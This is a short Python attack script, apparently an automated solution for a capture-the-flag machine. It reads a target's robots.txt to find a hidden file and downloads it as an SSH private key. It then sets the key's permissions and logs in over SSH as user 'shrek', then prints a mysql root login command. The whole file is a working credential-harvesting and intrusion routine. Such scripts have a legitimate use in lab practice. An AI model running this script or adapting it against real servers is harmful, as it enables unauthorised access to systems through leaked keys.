import requests
import subprocess
import sys
import os
import time


global url



def bloque1():
    while True:

        global archivo
        global url

        url = "http://" + sys.argv[1] + "/"

        r = requests.get(url + "/robots.txt")

        if r.status_code == 200:
            inicio = r.text.find("/") + 1
            fin = r.text.find(".txt") + 4
            archivo = r.text[inicio:fin]  
            print("Archivo encontrado") 
            url2 = url + archivo
            print("Abriendo URL: " + url2)
            break

def bloque2():
    while True:
        r = requests.get(url + archivo)
        print("Buscando archivo...")
        if r.status_code == 200:
            print("Archivo encontrado: " + archivo)
            print(r.text)
            with open("id_rsa", "w") as f:
                f.write(r.text)
                f.close()
            break
    try:
        os.chmod("id_rsa", 0o600)
        ssh_command = ['ssh', '-i', "id_rsa", 'shrek@' + sys.argv[1]] 
        subprocess.run(ssh_command)
    except:
        pass

    print("mysql -u root -p ")

if __name__ == "__main__":
    bloque1()
    bloque2()
